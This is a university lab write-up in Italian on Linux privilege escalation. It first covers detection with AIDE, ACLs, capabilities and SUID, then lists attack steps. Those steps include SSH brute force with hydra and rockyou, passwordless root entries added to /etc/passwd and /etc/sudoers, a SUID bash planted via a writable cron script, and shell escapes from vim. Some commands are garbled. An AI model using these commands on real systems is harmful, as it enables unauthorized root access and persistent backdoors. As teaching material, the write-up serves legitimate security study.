@@ -1,0 +1,191 @@
+# Nome: Davide Chirichella
+# Matricola: 0001071414
+# Esercizio: privilege escalation
+
+# DETECTION ==============================================================================
+
+Lo strumento che utilizzerò è "aide" (Advanced Intrusion Detection Environment), uno strumento 
+che monitora l'integrità dei file di sistema, confrontandone lo stato attuale con una "fotografia" iniziale per 
+rilevare modifiche non autorizzate.
+
+1. Imposto su /etc/aide/aide.conf la direttiva per indicare tutte le cartelle potenzialmente modificabili.
+In questo caso, come da traccia:
+
+	# @@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$ da commentare...
+
+	/bin  f  Full
+	/usr/bin  f  Full
+	/etc/    f Full
+
+2. Avvio aide per fare una "fotografia" dello stato attuale del mio sistema mediante il comando:
+
+	sudo aideinit
+
+Potrebbe essere necessario copiare a mano il database con
+
+	mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
+
+3. Lancio una scansione con "aide -C -c /etc/aide/aide.conf"
+
+4. Eseguo il programma vulnerabile
+
+5. Eseguo nuovamente una scansione con "aide -C -c /etc/aide/aide.conf"
+
+3. Noto, anche mediante i comandi "getcap" e "getfacl", che il binario fornito ha effettuato le seguenti operazioni:
+! ATTENZIONE AI FALSI POSITIVI !
+
+- Impostate nelle ACL al file /etc/crontab (che permettono di definire permessi più granulari su file e cartelle):
+
+	- SPY rw-: conferisce all'utente "spy" permessi di lettura e scrittura,
+	permettendogli quindi di modificare il file
+	
+	- MASK: limita i permessi effettivi concessi ad utenti/gruppi tramite ACL. In questo caso, 
+	visto che l'ACL dà rwx, ma la mask dice r--, allora il massimo accesso sarà r--
+
+- Aggiunte delle capability al programma "vim.tiny" (danno a un processo permessi specifici di root, senza concedere tutti i privilegi di root.) 
+
+	(possono essere viste tutte con man 7 capabilities):
+
+	- **CAP_DAC_OVERRIDE**: ovvero la capacità di ignorare i permessi di lettura/scrittura sui file, anche quelli di sistema protetti
+	- **CAP_FOWNER**: Può cambiare i permessi a qualsiasi file
+	- **CAP_SYS_ADMIN**: Concede accesso a numerose operazioni amministrative.
+	- **CAP_NET_RAW**: Permette l'uso di socket raw e operazioni di rete a basso livello.
+	- **CAP_SETUID**: Consente di cambiare l'UID effettivo di un processo.
+	- **CAP_SETGID**: Consente di cambiare il GID effettivo di un processo.
+	
+Le flag impostate sono di solito:
+e = effective: la capability è attiva e utilizzata per i controlli di accesso
+p = permitted: la capability è concessa al processo
+
+- Settato il SUID al programma "cp". Adesso, chiunque esegua quel programma 
+lo eseguirà con i privilegi dell'utente proprietario del file, root in questo caso
+Per capirlo, lancio un ls -l sulla directory e vedo che:
+
+	-rwsr-xr-x 1 root root 12345 Jun 26 10:00 /usr/bin/passwd 
+	La s indica che il set user id è attivo. Se fosse stato
+	rwxr-sr-x ... , allora il SGID era attivo. Ricorda che su una
+	forza i file creati dentro ad ereditare il gruppo.
+
+- Controllo i "processi nascosti" che possono essere stati impostati
+	`systemctl list timers`: Se un timer viene eseguito come root e l’utente può modificare lo script o la directory da cui viene eseguito, è un'escalation diretta.
+	
+	`atq: se un attaccante ha accesso a at e può eseguire job come root (per esempio via sudo o setuid su at), può eseguire un payload.
+
+		(root) NOPASSWD: /usr/bin/at
+		
+		Posso fare: echo "echo 'toor::0:0:root:/root:/bin/bash' >> /etc/passwd" | sudo at now + 1 minute
+		Oppure: echo "echo 'bad ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers" | sudo at now + 1 minute
+		
+
+	`crontab -l`: È stato definito un cronjob con script scrivibile:
+
+		*/5 * * * * root /opt/scripts/backup.sh
+		# ha permessi root, ma è scrivibile da un utente non privilegiato
+
+		ls -l /opt/scripts/backup.sh
+		-rwxrwxrwx 1 root root 1234 Jun 5 09:00 /opt/scripts/backup.sh
+
+		# se al backup.sh aggiungo la riga:
+		cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+		# L’utente user può poi semplicemente lanciare /tmp/rootbash e ottenere una shell root
+
+# ATTACK =================================================================================
+# n.b. i permessi di un utente possono essere visti in qualsiasi momento con sudo -l
+
+1. Utilizzo di hydra per attaccare mediante wordlist l'utente aggiunto e fare il login
+`sudo systemctl start ssh` in caso in cui non fosse autorizzato l'accesso ssh è "concesso"
+attivarlo
+
+	gunzip rockyou.txt.gz
+	hydra -l spy -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+
+Oppure, se non devo usare l'accesso ssh, posso provare con john (vedi in ../utils)
+
+2. Utilizzo di vim.tiny per aggiungere su /etc/passwd un utente con accesso privilegiato
+(backdoor) che può fare login senza password, avrà UID e GID di root (0 entrambi), 
+/root come home directory e /usr/bin/zsh come shell di login.
+
+	toor::0:0:root:/root:/usr/bin/zsh
+
+In caso in cui volessimo generare una password, utilizziamo OpenSSL per:
+	1. codificarla con l'aggiunta di un salt
+	openssl rand -base64 32
+	
+	2. codificare la password "hack" con il salt precedentemente calcolato 
+	openssl passwd -6 -salt mqn8xWt4j5pjMVxh66RmfPWQtLrrVphcI8aXI/iNzoY= hack per codificare la password "hack"
+	con il salt precedentemente calcolato	
+	
+	3. inserisco la entry (password "da non cambiare praticamente mai")
+	user:{hash}:19424:0:99999:7:::
+	
+	4. eseguo sudo -i hack e alla richiesta inserisco la password "hack"
+	
+
+Potrei anche utilizzarlo per aggiungere su /etc/sudoers i permessi di root tramite sudoers
+all'utente bad
+	 
+	echo 'bad    ALL=(root) NOPASSWD: ALL' >> /etc/sudoers
+	
+Così posso lanciare sudo -i e non mi chiederà la password
+
+3. È anche possibile, tramite vim, eseguire comandi direttamente al suo interno con :!
+Possiamo quindi aprire una shell di root con 
+
+	:!/bin/bash
+	
+Se vim è limitato a un file, faccio path traversal
+
+	sudo /usr/bin/vi /var/www/html/../../../etc/shadow
+
+
+2. Si potrebbe anche non aggiungere utenti ma semplicemente settare l'id di un utente a 0, 
+trasformandolo in un utente "root" che ha accesso illimitato al sistema e può eseguire qualsiasi operazione
+Se posso fare solo chmod con root, potrei mettere
+
+	chmod 777 al file /etc/passwd
+
+E togliere la password a root
+
+
+3. L'utente "intruso" ha i permessi di scrittura con sudoers, il file che specifica quali operazioni un utente 
+può fare con privilegi elevati (es. come root o altri utenti). Per diventare root basterà quindi diventare l'utente intruso 
+(`su intruso`, non chiederà nessuna password come previsto), editare il file /etc/sudoers ed inserire questa riga
+
+	intruso ALL=(ALL:ALL) ALL
+
+In questo modo gli sto dicendo che, tramite sudo, "intruso", da QUALSIASI HOST potrà eseguire con i privilegi di QUALSIASI UTENTE
+ QUALSIASI COMANDO. A questo punto, eseguendo il comando `sudo -i`, eseguiamo una shell con privilegi di root e 
+lanciamo il comando id
+
+Se invece è specificata una riga che lo autorizza ad eseguire un comando come un altro utente 
+
+	intruso ALL=(worse) /comando
+
+Sarà possibile eseguirlo con
+
+	sudo -u worse /comando
+
+4. Per settarmi "da solo" dei privilegi:
+
+- Assegno il suid a cp
+
+	chmod u+s /bin/cp
+	ls -al /bin/cpcp /etc/passwd .
+
+	Così potrò copiare il file /etc/shadow e modificarlo
+	
+	cat passwd > pass.rw    # Crea una copia leggibile/scrivibile
+	cat shadow > shad.rw    # Stessa cosa per shad
+
+- Assegno delle acl per dare lettura e scrittura di kali al file sudoers
+	
+	setfacl -m u:kali:rw /etc/sudoers
+	
+- Mi assegno una capability CAP_DAC_OVERRIDE, la capacità di ignorare i permessi di lettura/scrittura 
+sui file, anche quelli di sistema protetti.
+	
+	sudo /usr/sbin/setcap "CAP_DAC_OVERRIDE=eip" /usr/bin/vim.tiny
+
+5. Se ho un programma che posso editare ed eseguire con i privilegi di root, potrei scriverci
+
+	`sudo su` oppure `sudo -i`  
